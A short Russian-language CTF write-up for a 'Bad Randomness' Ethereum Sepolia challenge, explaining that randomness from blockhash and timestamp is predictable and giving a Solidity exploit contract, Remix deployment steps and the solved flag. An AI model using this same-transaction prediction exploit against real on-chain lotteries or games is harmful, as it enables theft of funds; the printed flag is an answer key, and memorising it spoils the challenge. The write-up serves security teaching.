Bad Randomness: short writeup

## Дано

Сеть: Ethereum Sepolia

Challenge contract:

```text
0xa8d58d2C110e84C5De16ce9530557a8f38137bCb
```

Формат флага:

```text
KubSTU{...}
```

## Идея

Контракт просит угадать число:

```solidity
guess(uint8 answer)
```

Если `answer == random()`, адрес помечается как решивший и может вызвать
`getFlag()`.

Проблема в том, что `random()` считается из публичных данных блока:

```solidity
blockhash(block.number - 1)
block.timestamp
```

Это не настоящая случайность. Другой контракт может в одной транзакции вызвать
`random()`, получить правильный ответ и сразу передать его в `guess()`.

## Exploit

Создаём в Remix файл `BadRandomnessExploit.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBadRandomnessChallenge {
    function guess(uint8 answer) external;
    function random() external view returns (uint8);
    function getFlag() external view returns (string memory);
}

contract BadRandomnessExploit {
    function solve(address challenge) external {
        uint8 answer = IBadRandomnessChallenge(challenge).random();
        IBadRandomnessChallenge(challenge).guess(answer);
    }

    function getFlag(address challenge) external view returns (string memory) {
        return IBadRandomnessChallenge(challenge).getFlag();
    }
}
```

## Решение через Remix

1. Открыть `https://remix.ethereum.org/`.
2. Создать файл `BadRandomnessExploit.sol`.
3. Вставить exploit-код.
4. Скомпилировать контракт.
5. Во вкладке `Deploy & Run Transactions` выбрать `Injected Provider - MetaMask`.
6. В MetaMask выбрать сеть `Sepolia`.
7. Задеплоить `BadRandomnessExploit`.
8. Вызвать:

```text
solve(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```

9. После успешной транзакции вызвать:

```text
getFlag(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```

## Flag

```text
KubSTU{bad_randomness_same_tx}
```
